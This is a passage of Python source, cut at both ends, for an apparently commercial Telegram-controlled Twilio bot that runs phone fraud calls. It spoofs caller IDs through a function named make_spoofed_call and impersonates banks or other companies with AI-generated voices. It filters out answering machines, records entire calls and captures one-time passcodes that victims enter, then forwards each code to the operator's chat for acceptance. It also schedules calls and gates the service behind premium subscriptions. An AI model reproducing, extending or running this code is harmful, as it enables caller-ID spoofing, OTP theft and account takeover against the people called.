                                        timeout=REQ_TIMEOUT,
                                    )
                                except Exception:
                                    pass
                                try:
                                    report_twilio_call_status(chat_id, final_sid, user=user_obj)
                                except Exception:
                                    pass
                            sid.add_done_callback(_finalize_call)
                    except Exception:
                        pass
            except Exception as e:
                try:
                    bot.send_message(chat_id, f"❌ Failed to initiate emotion call: {e}")
                except Exception:
                    pass

        run_callback_async(_start)
    except Exception:
        try:
            bot.send_message(chat_id, "❌ Could not start AI Emotion Call due to internal error.")
        except Exception:
            pass


def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_message_id: Optional[int] = None, mode_label: Optional[str] = None) -> None:
    """Start a Normal Call that always uses the single ultimate script endpoints.

    Creates a Twilio call whose webhook points to `/focus_listen_flow` which
    records briefly then redirects into `/normal_advanced_flow` so the single
    ultimate script is used for all normal calls.
    """
    if mode_label is None:
        mode_label = "Normal Call"
    try:
        # Decrement free trial for non-premium users before making the call
        if not is_premium_user(user_id_str):
            remaining = decrement_free_call(user_id_str)
            if remaining < 0:
                # This should not happen due to callback-level check, but safeguard anyway
                bot.send_message(chat_id, "❌ Free trial exhausted. Purchase a subscription to continue.")
                return
        
        ensure_user_path(user_id_str)
        phonenum = normalize_phone_number(read_user_file(user_id_str, "phonenum.txt", ""))
        if not phonenum or not is_valid_e164(phonenum):
            bot.send_message(chat_id, "❌ Invalid or missing target phone number. Please set the phone number in your call settings.")
            return

        caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip() or TWILIO_PHONE_NUMBER
        bot.send_message(chat_id, "✨ Starting Normal Call. Live listen will be available shortly.")

        def _start():
            try:
                # Determine webhook based on USE_AI_FLOW
                from config import USE_AI_FLOW, DEFAULT_VOICE_ID
                
                name = read_user_file(user_id_str, "Name.txt", "Customer")
                company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                from_name = read_user_file(user_id_str, "From Name.txt", "").strip()
                language = (read_user_file(user_id_str, "Language.txt", "en") or "en").upper()
                delivery = (read_user_file(user_id_str, "Delivery.txt", "sms") or "sms").upper()
                voice_id = read_user_file(user_id_str, "Voice.txt", DEFAULT_VOICE_ID)
                code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                emotion = read_user_file(user_id_str, "emotion.txt", "neutral").strip()
                voice_name = read_user_file(user_id_str, "VoiceName.txt", "") or ""
                if not voice_name:
                    voice_key = get_voice_key_by_id(voice_id)
                    if voice_key:
                        voice_name = VOICE_MAPPING.get(voice_key, {}).get("name", "")

                setup_summary = (
                    f"📋 Call settings:\n"
                    f"• Target: {name}\n"
                    f"• Company: {company}\n"
                    f"• Caller identity: {from_name or company}\n"
                    f"• Number: {phonenum}\n"
                    f"• Caller ID: {caller_id}\n"
                    f"• Voice: {voice_name or voice_id}\n"
                    f"• Language: {language}\n"
                    f"• Delivery: {delivery}\n"
                    f"• OTP length: {code_length}\n"
                    f"• Mode: {mode_label}\n"
                )
                bot.send_message(chat_id, f"✨ Starting Normal Call with current setup:\n\n{setup_summary}")

                webhook_url = (
                    f"{NGROK_URL.rstrip('/')}/amd_hold"
                    f"?user_id={quote_plus(str(user_id_str))}"
                    f"&chat_id={quote_plus(str(chat_id))}"
                    f"&name={quote_plus(name)}"
                    f"&company={quote_plus(company)}"
                    f"&from_name={quote_plus(from_name)}"
                    f"&voice_id={quote_plus(voice_id)}"
                    f"&emotion={quote_plus(emotion)}"
                    f"&language={quote_plus(language)}"
                    f"&delivery={quote_plus(delivery)}"
                    f"&code_length={quote_plus(code_length)}"
                    f"&caller_id={quote_plus(caller_id)}"
                    f"&call_type=normal"
                    f"&mode_label={quote_plus(mode_label or 'Normal Call')}"
                )
                
                sid = make_spoofed_call(
                    to=phonenum,
                    from_number=TWILIO_PHONE_NUMBER,
                    caller_id=caller_id,
                    webhook_url=webhook_url,
                    user_id=user_id_str,
                    chat_id=chat_id,
                    call_record=True,  # CRITICAL: Enable full-call recording from start to end
                )
                if not sid:
                    raise Exception("Failed to create normal call")

                # Resolve Future if returned by the async call helper. Avoid passing
                # a Future into JSON serialization or storage.
                resolved_sid = None
                try:
                    # Many async helpers return concurrent.futures.Future which
                    # exposes `result` and `add_done_callback`.
                    if hasattr(sid, "result") and callable(getattr(sid, "result")):
                        resolved_sid = sid.result(timeout=5)
                    else:
                        resolved_sid = sid
                except Exception:
                    resolved_sid = None

                def _on_future_done(fut):
                    try:
                        final_sid = fut.result()
                    except Exception:
                        return
                    try:
                        store_call_metadata(user_id_str, final_sid, target=phonenum)
                    except Exception:
                        logger.exception("Failed to store call metadata in future callback")
                    try:
                        _http.post(
                            f"{LIVE_LISTEN_URL}/conversation/start",
                            json={"call_sid": final_sid, "chat_id": chat_id},
                            timeout=REQ_TIMEOUT,
                        )
                    except Exception:
                        pass

                # If we have a concrete SID, proceed to store, notify, and track status.
                user_obj = types.User(id=call_from_user.id, is_bot=False, first_name=read_user_file(user_id_str, "Name.txt") or "User")
                if resolved_sid:
                    register_call_session(
                        resolved_sid,
                        user_id_str,
                        chat_id=chat_id,
                        endpoint="/initiate_normal_call",
                        mode_label=mode_label,
                        status_chat_id=chat_id,
                        status_message_id=status_message_id,
                    )
                    store_call_metadata(user_id_str, resolved_sid, target=phonenum)
                    live_buttons = types.InlineKeyboardMarkup(row_width=1)
                    live_buttons.add(types.InlineKeyboardButton("🎧 LIVE LISTEN", callback_data="live_listen"))
                    bot.send_message(chat_id, "🎯 Normal call started. Tap LIVE LISTEN to open the monitoring panel.", reply_markup=live_buttons)
                    # Clear per-user call setup immediately after initiating the call
                    try:
                        clear_user_call_setup(user_id_str)
                    except Exception:
                        logger.exception(f"Failed to clear call setup after start for user {user_id_str}")
                    try:
                        # Record the setup hash used for this initiated call so it cannot
                        # be reused after the call completes.
                        if current_hash:
                            _write_last_setup_hash(user_id_str, current_hash)
                    except Exception:
                        logger.exception("Failed to record last setup hash")
                    try:
                        _http.post(
                            f"{LIVE_LISTEN_URL}/conversation/start",
                            json={"call_sid": resolved_sid, "chat_id": chat_id},
                            timeout=REQ_TIMEOUT,
                        )
                    except Exception:
                        pass
                else:
                    # Sid is not yet available (pending Future). Attach a callback if possible
                    try:
                        if hasattr(sid, "add_done_callback") and callable(getattr(sid, "add_done_callback")):
                            def _finalize_call(fut):
                                try:
                                    final_sid = fut.result()
                                except Exception:
                                    return
                                try:
                                    register_call_session(
                                        final_sid,
                                        user_id_str,
                                        chat_id=chat_id,
                                        endpoint="/initiate_normal_call",
                                        mode_label=mode_label,
                                        status_chat_id=chat_id,
                                        status_message_id=status_message_id,
                                    )
                                except Exception:
                                    pass
                                try:
                                    store_call_metadata(user_id_str, final_sid, target=phonenum)
                                except Exception:
                                    logger.exception("Failed to store call metadata in future callback")
                                try:
                                    _http.post(
                                        f"{LIVE_LISTEN_URL}/conversation/start",
                                        json={"call_sid": final_sid, "chat_id": chat_id},
                                        timeout=REQ_TIMEOUT,
                                    )
                                except Exception:
                                    pass
                                try:
                                    report_twilio_call_status(chat_id, final_sid, user=user_obj)
                                except Exception:
                                    pass
                            sid.add_done_callback(_finalize_call)
                    except Exception:
                        logger.exception("Failed to attach done-callback to call future")
                    bot.send_message(chat_id, "🎯 Normal call queued. You'll be notified when the call starts.")
                    # Clear per-user call setup for queued calls as well
                    try:
                        clear_user_call_setup(user_id_str)
                    except Exception:
                        logger.exception(f"Failed to clear call setup after queuing for user {user_id_str}")
            except Exception as e:
                try:
                    bot.send_message(chat_id, f"❌ Failed to initiate normal call: {e}")
                except Exception:
                    pass

        run_callback_async(_start)
    except Exception:
        try:
            bot.send_message(chat_id, "❌ Could not start Normal Call due to internal error.")
        except Exception:
            pass


def _execute_single_schedule(sched, user_id, schedule_path, schedules):
    try:
        phone = sched["phone"]
        schedule_type = sched.get("type", "voice")
        if schedule_type == "manual":
            manual_params = sched.get("manual_params", {}) or {}
            caller_id = manual_params.get("caller_id") or TWILIO_PHONE_NUMBER
            webhook_url = f"{NGROK_URL.rstrip('/')}/manual_flow?user_id={quote_plus(str(user_id))}"
            if sched.get("schedule_id"):
                webhook_url += f"&schedule_id={quote_plus(str(sched.get('schedule_id')))}"
            chat_id = sched.get("chat_id")
            if chat_id is not None:
                webhook_url += f"&chat_id={quote_plus(str(chat_id))}"
            sid = make_spoofed_call(
                to=phone,
                from_number=TWILIO_PHONE_NUMBER,
                caller_id=caller_id,
                webhook_url=webhook_url,
                user_id=user_id,
                call_record=True,
            )
        elif schedule_type == "custom":
            custom_params = sched.get("custom_params", {}) or {}
            caller_id = custom_params.get("caller_id") or TWILIO_PHONE_NUMBER
            webhook_url = f"{NGROK_URL.rstrip('/')}/custom_flow?user_id={quote_plus(str(user_id))}"
            if sched.get("schedule_id"):
                webhook_url += f"&schedule_id={quote_plus(str(sched.get('schedule_id')))}"
            chat_id = sched.get("chat_id")
            if chat_id is not None:
                webhook_url += f"&chat_id={quote_plus(str(chat_id))}"
            sid = make_spoofed_call(
                to=phone,
                from_number=TWILIO_PHONE_NUMBER,
                caller_id=caller_id,
                webhook_url=webhook_url,
                user_id=user_id,
                call_record=True,
            )
        else:
            emotion = sched.get("emotion", "neutral")
            webhook_url = (
                f"{NGROK_URL.rstrip('/')}/ai_start"
                f"?user_id={user_id}"
                f"&emotion={emotion}"
                f"&call_type=normal"
                f"&mode_label=Normal%20Call"
            )
            sid = make_spoofed_call(
                to=phone,
                from_number=TWILIO_PHONE_NUMBER,
                caller_id=read_user_file(user_id, "Caller ID.txt", TWILIO_PHONE_NUMBER),
                webhook_url=webhook_url,
                user_id=user_id,
            )
        if sid:
            sched["status"] = "completed"
            sched["sid"] = sid
            logger.info(f"Scheduled call executed: {phone} -> {sid}")
        else:
            sched["status"] = "failed"
    except Exception as e:
        logger.error(f"Schedule execution error for {user_id}: {e}")
        sched["status"] = "failed"


def process_scheduled_calls():
    """Background thread to check and execute scheduled calls."""
    while True:
        time.sleep(60)
        conf_dir = Path("conf")
        if not conf_dir.exists():
            continue
        for user_folder in conf_dir.iterdir():
            if not user_folder.is_dir():
                continue
            user_id = user_folder.name
            schedule_path = user_folder / "scheduled_calls.json"
            if not schedule_path.exists():
                continue
            try:
                schedules = json.loads(schedule_path.read_text())
                updated = False
                for sched in schedules:
                    if sched.get("status") != "pending":
                        continue
                    target_time = datetime.fromisoformat(sched["time"])
                    if datetime.now() >= target_time:
                        t = threading.Thread(target=_execute_single_schedule, args=(sched, user_id, schedule_path, schedules), daemon=True)
                        t.start()
                        t.join(timeout=20)
                        updated = True
                if updated:
                    schedule_path.write_text(json.dumps(schedules, indent=2))
            except Exception as e:
                logger.error(f"Schedule processing error for {user_id}: {e}")

def start_scheduler():
    thread = threading.Thread(target=process_scheduled_calls, daemon=True)
    thread.start()

# ======================================================================
# RATE LIMITER
# ======================================================================
@dataclass
class TokenBucket:
    capacity: int = 10
    refill_rate: float = 1.0
    tokens: float = 10.0
    last_refill: float = field(default_factory=time.time)
    violations: int = 0
    banned_until: float = 0.0
    ban_start_time: float = 0.0

    def refill(self) -> None:
        now = time.time()
        elapsed = now - self.last_refill
        self.tokens = min(self.capacity, self.tokens + elapsed * self.refill_rate)
        self.last_refill = now

    def consume(self, tokens: int = 1) -> bool:
        self.refill()
        if self.tokens >= tokens:
            self.tokens -= tokens
            self.violations = 0
            return True
        else:
            self.violations += 1
            return False

    def is_banned(self) -> bool:
        if self.banned_until == 0:
            return False
        if time.time() < self.banned_until:
            return True
        self.banned_until = 0
        self.violations = 0
        return False

    def apply_ban(self, duration: float) -> None:
        self.banned_until = time.time() + duration
        self.ban_start_time = time.time()
        self.tokens = 0

class RateLimiter:
    def __init__(
        self,
        default_capacity: int = 10,
        default_refill_rate: float = 1.0,
        max_violations_before_ban: int = 5,
        base_ban_duration: float = 300.0,
        max_ban_duration: float = 86400.0,
        ban_escalation_factor: float = 2.0,
    ):
        self.default_capacity = default_capacity
        self.default_refill_rate = default_refill_rate
        self.max_violations_before_ban = max_violations_before_ban
        self.base_ban_duration = base_ban_duration
        self.max_ban_duration = max_ban_duration
        self.ban_escalation_factor = ban_escalation_factor

        self._buckets: Dict[str, TokenBucket] = defaultdict(lambda: TokenBucket(
            capacity=default_capacity,
            refill_rate=default_refill_rate,
        ))
        self._ban_history: Dict[str, list] = defaultdict(list)
        self._lock = threading.RLock()

    def _get_identifier(self, user_id: str, ip_address: str) -> str:
        raw = f"{user_id}:{ip_address}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    def _escalate_ban_duration(self, identifier: str) -> float:
        now = time.time()
        self._ban_history[identifier] = [
            ts for ts in self._ban_history[identifier] if now - ts < 604800
        ]
        ban_count = len(self._ban_history[identifier])
        if ban_count == 0:
            return self.base_ban_duration
        duration = min(
            self.base_ban_duration * (self.ban_escalation_factor ** ban_count),
            self.max_ban_duration
        )
        return duration

    def cleanup_expired(self) -> None:
        now = time.time()
        with self._lock:
            to_delete = [
                identifier
                for identifier, bucket in self._buckets.items()
                if now - bucket.last_refill > 3600 and bucket.violations == 0
            ]
            for identifier in to_delete:
                del self._buckets[identifier]
                if identifier in self._ban_history:
                    del self._ban_history[identifier]
            if to_delete:
                logger.debug(f"Cleaned up {len(to_delete)} idle rate limiter buckets")

    def check_and_consume(
        self,
        user_id: str,
        ip_address: str,
        tokens: int = 1,
    ) -> Tuple[bool, Optional[float]]:
        identifier = self._get_identifier(user_id, ip_address)
        with self._lock:
            bucket = self._buckets[identifier]
            if bucket.is_banned():
                remaining = max(0.0, bucket.banned_until - time.time())
                return False, remaining
            allowed = bucket.consume(tokens)
            if not allowed:
                bucket.violations += 1
                if bucket.violations >= self.max_violations_before_ban:
                    duration = self._escalate_ban_duration(identifier)
                    bucket.apply_ban(duration)
                    self._ban_history[identifier].append(time.time())
                    logger.warning(
                        f"Rate limit ban applied to {identifier} for {duration:.0f}s "
                        f"(violations={bucket.violations})"
                    )
                    return False, duration
                return False, None
            else:
                return True, None

_limiter = None
def get_rate_limiter() -> RateLimiter:
    global _limiter
    if _limiter is None:
        _limiter = RateLimiter(
            default_capacity=RATE_LIMIT_CAPACITY,
            default_refill_rate=RATE_LIMIT_REFILL_RATE,
            max_violations_before_ban=RATE_LIMIT_MAX_VIOLATIONS,
            base_ban_duration=RATE_LIMIT_BASE_BAN_DURATION,
            max_ban_duration=RATE_LIMIT_MAX_BAN_DURATION,
            ban_escalation_factor=RATE_LIMIT_BAN_ESCALATION_FACTOR,
        )
    return _limiter

def start_rate_limiter_cleanup(interval: int = 3600) -> None:
    def _cleanup():
        limiter = get_rate_limiter()
        while True:
            time.sleep(interval)
            limiter.cleanup_expired()
    thread = threading.Thread(target=_cleanup, daemon=True)
    thread.start()

# ======================================================================
# FLASK ENDPOINTS
# ======================================================================
@app.route("/audio")
def serve_audio():
    user_id = request.args.get("user_id")
    file = request.args.get("file")
    if not user_id or not file:
        return Response("", status=404)
    path = user_conf_path(user_id) / file
    if not path.exists():
        return Response("", status=404)
    return send_file(path, mimetype="audio/mpeg")

@app.route("/live_capture_otp", methods=["POST"])
@twilio_request_logger("/live_capture_otp")
def live_capture_otp():
    if not validate_live_listen_request():
        return Response("Unauthorized", status=401)

    chat_id = request.values.get("chat_id")
    call_sid = request.values.get("call_sid")
    digits = request.values.get("digits")
    if not chat_id or not digits:
        return Response("Missing chat_id or digits", status=400)

    try:
        chat_id = int(chat_id)
    except (ValueError, TypeError):
        pass

    if chat_id and digits:
        send_telegram_status(chat_id, f"🔑 Code received via monitoring: {digits}")
        buttons = types.InlineKeyboardMarkup()
        buttons.add(types.InlineKeyboardButton("✅ ACCEPT", callback_data=f"otp_accept_{call_sid}_{digits}"))
        buttons.add(types.InlineKeyboardButton("❌ DECLINE", callback_data=f"otp_decline_{call_sid}_{digits}"))
        try:
            bot.send_message(
                chat_id,
                "🔐 *OTP Captured*\n\n"
                f"Code: `{digits}`\n\n"
                "Press ✅ to accept and complete the call, or ❌ to decline and retry. "
                "If no action is taken within 30 seconds, the code will be auto-accepted and the call will end.",
                reply_markup=buttons,
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.debug(f"Failed to send live listen OTP message: {e}")
        log_otp(call_sid, digits, status="captured")

    return Response("OK", status=200)



@app.route("/amd_hangup", methods=["POST"])
@twilio_request_logger("/amd_hangup")
def amd_hangup():
    resp = VoiceResponse()
    resp.say("Thank you for your time. Goodbye.")
    resp.hangup()
    return Response(str(resp), content_type="application/xml")


@app.route("/amd_callback", methods=["POST"])
@twilio_request_logger("/amd_callback")
def amd_callback():
    """
    Handle async AMD callbacks from Twilio.

    We parse the `AnsweredBy` value, attach it to the call session if available,
    and send a Telegram notification to the user/chat provided in the callback.
    """
    try:
        # Parse common fields
        call_sid = request.form.get("CallSid") or request.values.get("CallSid") or request.args.get("CallSid")
        answered_by = (request.form.get("AnsweredBy") or request.values.get("AnsweredBy") or request.args.get("AnsweredBy") or "").strip()
        chat_id = request.form.get("chat_id") or request.values.get("chat_id") or request.args.get("chat_id")
        user_id = request.form.get("user_id") or request.values.get("user_id") or request.args.get("user_id")

        logger.info(f"AMD callback received: CallSid={call_sid} AnsweredBy={answered_by} user_id={user_id} chat_id={chat_id}")

        # Attach the answered_by to the call session if present
        if call_sid:
            session = call_sessions.get(call_sid) or {}
            session["answered_by"] = answered_by or session.get("answered_by", "unknown")
            # preserve chat mapping if provided
            if chat_id and not session.get("chat_id"):
                try:
                    session["chat_id"] = int(chat_id)
                except Exception:
                    session["chat_id"] = chat_id
            call_sessions[call_sid] = session

        # Prepare a human-readable notification
        ab = (answered_by or "unknown").lower()
        if ab == "human":
            text = "📞 A human answered the call."
        elif "machine" in ab or "voicemail" in ab:
            text = "📞 A machine or voicemail answered the call."
        else:
            text = f"📞 Answer type: {answered_by or 'unknown'}."

        # Notify the chat if provided
        if chat_id:
            try:
                send_telegram_status(int(chat_id), text)
            except Exception:
                # fallback to current bot send implementation
                try:
                    safe_bot_send_message(int(chat_id), text)
                except Exception:
                    logger.debug("Failed to notify chat from AMD callback")

        # Also return the legacy handlers' response if any (call into handlers module)
        try:
            # Keep backward compatibility: allow handlers' AMD hook to run if it exists
            return amd_callback_flask(request)
        except Exception:
            return "", 200

    except Exception as e:
        logger.exception(f"AMD callback handler error: {e}")
        return "", 500


@app.route("/amd_hold", methods=["POST"])
@twilio_request_logger("/amd_hold")
def amd_hold():
    """Route the call based on Twilio AMD verdict before the greeting begins."""
    from twilio.twiml.voice_response import VoiceResponse

    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
    chat_id = request.values.get("chat_id") or request.args.get("chat_id")
    call_sid = request.values.get("CallSid") or request.args.get("CallSid") or request.values.get("call_sid") or request.args.get("call_sid")
    answered_by = (
        request.values.get("AnsweredBy")
        or request.args.get("AnsweredBy")
        or request.values.get("answered_by")
        or request.args.get("answered_by")
        or None
    )

    # Prefer server-side canonical AMD if available in call_sessions
    if call_sid and call_sid in call_sessions and call_sessions[call_sid].get("answered_by"):
        answered_by = call_sessions[call_sid].get("answered_by")

    # If no chat_id in the request, prefer session mapping
    if not chat_id and call_sid and call_sid in call_sessions:
        try:
            chat_id = call_sessions[call_sid].get("chat_id")
        except Exception:
            pass

    resp = VoiceResponse()
    if answered_by and str(answered_by).lower() not in ("human", "unknown", ""):
        # Notify user that machine/voicemail answered
        if chat_id is not None:
            try:
                send_telegram_status(int(chat_id), "📞 A machine or voicemail answered the call. Ending the call gracefully.")
            except Exception as e:
                logger.debug(f"Failed to notify chat from amd_hold: {e}")
        resp.say("Thank you. Goodbye.")
        resp.hangup()
        return Response(str(resp), content_type="application/xml")

    redirect_url = f"/handle_greeting?user_id={quote_plus(str(user_id))}"
    if chat_id:
        redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
    resp.pause(length=1)
    resp.redirect(redirect_url, method="POST")
    return Response(str(resp), content_type="application/xml")


@app.route("/twilio/recording", methods=["POST"])
@twilio_request_logger("/twilio/recording")
def twilio_recording_callback():
    return recording_callback()


@app.route("/recording_callback", methods=["POST"])
@twilio_request_logger("/recording_callback")
def recording_callback():
    """
    Handle Twilio recording status callbacks. Downloads the recording and forwards
    it to the Telegram chat specified in the original call creation (`user_id`/`chat_id`).
    """
    log_twilio_request_debug("/recording_callback")
    # Validate request
    is_valid = validate_twilio_request()
    if not is_valid:
        logger.error("[ERROR] Recording callback: Twilio validation FAILED")
        return Response("OK", status=200)

    try:
        recording_sid = request.form.get("RecordingSid") or request.values.get("RecordingSid")
        recording_url = request.form.get("RecordingUrl") or request.values.get("RecordingUrl")
        call_sid = request.form.get("CallSid") or request.values.get("CallSid")
        user_id = request.args.get("user_id") or request.form.get("user_id") or request.values.get("user_id")
        chat_id = request.args.get("chat_id") or request.form.get("chat_id") or request.values.get("chat_id")

        logger.info(
            "Recording callback received: call_sid=%s recording_sid=%s user_id=%s chat_id=%s recording_url=%s",
            call_sid, recording_sid, user_id, chat_id, recording_url,
        )

        if not recording_sid or not recording_url or not call_sid:
            logger.warning("Recording callback missing required fields: %s %s %s", recording_sid, recording_url, call_sid)
            return Response("OK", status=200)

        from requests.auth import HTTPBasicAuth
        import requests
        url = recording_url
        if url.endswith('.json'):
            url = url.replace('.json', '.mp3')
        elif not url.endswith('.mp3') and not url.endswith('.wav'):
            url = f"{recording_url}.mp3"

        r = requests.get(url, auth=HTTPBasicAuth(ACCOUNT_SID, AUTH_TOKEN), timeout=30)
        if r.status_code == 200 and r.content and len(r.content) > 128:
            saved_user_id = user_id or call_sessions.get(call_sid, {}).get("user_id")
            saved_chat_id = chat_id or call_sessions.get(call_sid, {}).get("chat_id")
            if saved_user_id:
                if not save_and_send_recording(call_sid, saved_user_id, saved_chat_id, r.content):
                    logger.warning(f"Failed to save/send recording for callback CallSid={call_sid}")
            else:
                logger.warning(f"Recording callback has no user_id for CallSid={call_sid}")
        else:
            logger.warning(f"Failed to download valid recording {recording_sid}: HTTP {r.status_code}, bytes={len(r.content) if r.content is not None else 'None'}")

    except Exception as e:
        logger.exception("Error in /recording_callback: %s", e)

    return Response("OK", status=200)

# ======================================================================
# AI-POWERED CALL FLOW ENDPOINT
# ======================================================================

@app.route("/ai_start", methods=["POST"])
def ai_start():
    """
    Entry point for AI-driven calls using Media Streams.
    Supports all call types: Normal, Manual, Custom, AI Emotion, Crack Blast.
    Receives Twilio call and starts Media Stream WebSocket.
    
    Query parameters:
    - user_id: Bot user ID
    - chat_id: Telegram chat ID
    - name: Target name
    - company: Company name
    - voice_id: ElevenLabs voice ID
    - emotion: Voice emotion (neutral, angry, calm, urgent)
    - custom_script: Custom script (for Manual/Custom call, overrides default system prompt)
    - code_length: OTP code length (optional, defaults to 6)
    - call_type: Call type (normal, manual, custom, emotion, crack_blast) - auto-detected if not provided
    - mode_label: Display label for UI
    """
    from config import USE_AI_FLOW, NGROK_URL, DEFAULT_VOICE_ID, SYSTEM_PROMPT
    from urllib.parse import quote_plus
    
    user_id = request.values.get("user_id") or request.args.get("user_id")
    chat_id = request.values.get("chat_id") or request.args.get("chat_id")
    name = request.values.get("name") or request.args.get("name")
    company = request.values.get("company") or request.args.get("company")
    voice_id = request.values.get("voice_id") or request.args.get("voice_id")
    emotion = request.values.get("emotion") or request.args.get("emotion", "neutral")
    custom_script = request.values.get("custom_script") or request.args.get("custom_script")
    code_length = request.values.get("code_length") or request.args.get("code_length", "6")
    call_type = request.values.get("call_type") or request.args.get("call_type", "normal")
    mode_label = request.values.get("mode_label") or request.args.get("mode_label", "AI Call")
    caller_id = request.values.get("caller_id") or request.args.get("caller_id")
    call_sid = request.values.get("CallSid", "")
    
    logger.info(f"[AI_START] Call {call_sid[:8] if call_sid else 'unknown'} type={call_type} user={user_id}")
    
    if not user_id:
        return Response("Missing user_id", status=400)
    
    if not USE_AI_FLOW:
        logger.error(f"[AI_START] CRITICAL: /ai_start called but USE_AI_FLOW=false")
        return Response("AI flow is disabled in config", status=400)
    
    session = None
    try:
        from ai.session import get_session
        if not call_sid:
            logger.error(f"[AI_START] CRITICAL: Missing CallSid from Twilio")
            return Response("Missing CallSid", status=400)
        
        session = get_session(call_sid)
        
        # Initialize session with all call type data
        session.name = name or read_user_file(user_id, "Name.txt", "Customer")
        session.company = company or read_user_file(user_id, "Company Name.txt", "your bank")
        session.voice_id = voice_id or read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
        session.emotion = emotion.lower() if emotion else "neutral"
        try:
            session.chat_id = int(chat_id) if chat_id else None
        except (ValueError, TypeError):
            session.chat_id = None
        session.custom_script = custom_script  # Used as override system prompt for Manual/Custom/Emotion
        session.call_type = call_type
        session.mode_label = mode_label
        session.caller_id = caller_id
        
        try:
            session.code_length = int(code_length)
        except (ValueError, TypeError):
            session.code_length = 6
        
        logger.warning(
            f"[AI_START] ✅ Session initialized: "
            f"CallSid={call_sid[:8]}, type={call_type}, emotion={session.emotion}, "
            f"code_len={session.code_length}, voice={session.voice_id}"
        )
    except ImportError as e:
        logger.error(f"[AI_START] CRITICAL: Cannot import ai.session - {e}")
        return Response("AI modules not installed", status=500)
    except Exception as e:
        logger.error(f"[AI_START] CRITICAL: Session init error - {e}", exc_info=True)
        return Response(f"Session init error: {e}", status=500)
    
    if not session:
        logger.error(f"[AI_START] CRITICAL: Session is None after initialization")
        return Response("Session initialization failed", status=500)
    
    # Register call in session tracking with proper mode_label
    register_call_session(
        call_sid,
        user_id,
        chat_id=int(chat_id) if chat_id else None,
        endpoint="/ai_start",
        mode_label=mode_label
    )
    
    # Build TwiML: start the Media Stream
    resp = VoiceResponse()
    start = Start()
    
    # WebSocket URL for audio streaming (stripped of protocol for wss:// format)
    stream_url = f"wss://{NGROK_URL.replace('https://', '').replace('http://', '')}/twilio/media"
    start.stream(url=stream_url)
    resp.append(start)
    
    if chat_id:
        try:
            bot.send_message(int(chat_id), f"🤖 {mode_label} started with AI. Live listen active.")
        except Exception:
            pass
    
    logger.info(f"[AI_START] ✅ Starting Media Stream for {mode_label}: {call_sid}")
    return Response(str(resp), content_type="application/xml")

@app.route("/voice", methods=["POST"])
@twilio_request_logger("/voice")
def voice():
    call_sid = request.values.get("CallSid", "")
    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
    answered_by = request.values.get("AnsweredBy") or request.values.get("answered_by")
    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None

    logger.info(
        f"[VOICE] Call {call_sid[:8] if call_sid else 'unknown'} for user {user_id} answered_by={answered_by or 'unknown'}"
    )

    resp = VoiceResponse()
    if answered_by and answered_by.lower() not in ("human", "unknown", ""):
        # Thank the machine/voicemail and hang up gracefully.
        resp.say("Thank you. Goodbye.")
        resp.hangup()
        return Response(str(resp), content_type="application/xml")

    redirect_url = f"/amd_hold?user_id={quote_plus(str(user_id))}"
    if chat_id is not None:
        redirect_url += f"&chat_id={quote_plus(str(chat_id))}"

    # Preserve initial normal call setup params so later stages use the correct values
    for key in [
        "name",
        "company",
        "from_name",
        "voice_id",
        "voice_name",
        "emotion",
        "language",
        "delivery",
        "code_length",
        "call_type",
        "mode_label",
        "caller_id",
    ]:
        value = request.values.get(key) or request.args.get(key)
        if value and value not in ("None", "unknown"):
            redirect_url += f"&{quote_plus(str(key))}={quote_plus(str(value))}"

    resp.redirect(redirect_url, method="POST")
    return Response(str(resp), content_type="application/xml")


@app.route("/manual_flow", methods=["POST"])
def manual_flow():
    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
    schedule_id = request.values.get("schedule_id") or request.args.get("schedule_id")
    call_sid = request.values.get("CallSid", "")
    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None

    register_call_session(call_sid, user_id, chat_id=chat_id, endpoint="/manual_flow", mode_label="Manual Calling")

    if schedule_id and user_id != "unknown":
        scheduled = _load_scheduled_params(user_id, schedule_id)
        if scheduled and scheduled.get("type") == "manual":
            manual_params = scheduled.get("manual_params", {}) or {}
            script = manual_params.get("script", "").strip()
            voice_id = str(manual_params.get("voice_id", "")).strip() or resolve_voice_id(user_id, "manual_voice_id.txt")
            delay = str(manual_params.get("delay", "0")).strip() or "0"
            fallback = manual_params.get("fallback", "").strip()
            digits = str(manual_params.get("digits", "0")).strip() or "0"
        else:
            script = read_user_file(user_id, "manual_script.txt", "").strip()
            voice_id = resolve_voice_id(user_id, "manual_voice_id.txt")
            delay = read_user_file(user_id, "manual_delay.txt", "0").strip() or "0"
            fallback = read_user_file(user_id, "manual_fallback.txt", "").strip()
            digits = read_user_file(user_id, "manual_digits.txt", "0").strip() or "0"
    else:
        script = read_user_file(user_id, "manual_script.txt", "").strip()
        voice_id = resolve_voice_id(user_id, "manual_voice_id.txt")
        delay = read_user_file(user_id, "manual_delay.txt", "0").strip() or "0"
        fallback = read_user_file(user_id, "manual_fallback.txt", "").strip()
        digits = read_user_file(user_id, "manual_digits.txt", "0").strip() or "0"

    voice_name = read_user_file(user_id, "VoiceName.txt", "") or ""
    if not voice_name and voice_id:
        voice_key = get_voice_key_by_id(voice_id)
        if voice_key:
            voice_name = VOICE_MAPPING.get(voice_key, {}).get("name", "")
    register_call_session(
        call_sid,
        user_id,
        chat_id=chat_id,
        endpoint="/manual_flow",
        voice_id=voice_id,
        voice_name=voice_name,
    )

    try:
        delay = int(delay)
    except ValueError:
        delay = 0
    try:
        digits = int(digits)
    except ValueError:
        digits = 0

    if chat_id:
        send_call_stage_status(chat_id, "MANUAL_FLOW", "Playing manual call script")

    resp = VoiceResponse()
    if delay > 0:
        resp.pause(length=delay)

    audio_url = None
    if script:
        audio_url = generate_call_audio(user_id=user_id, text=script, voice_id=voice_id, filename="manual_flow.mp3")

    if digits > 0:
        action = f"/live_capture_otp?user_id={quote_plus(str(user_id))}"
        if chat_id is not None:
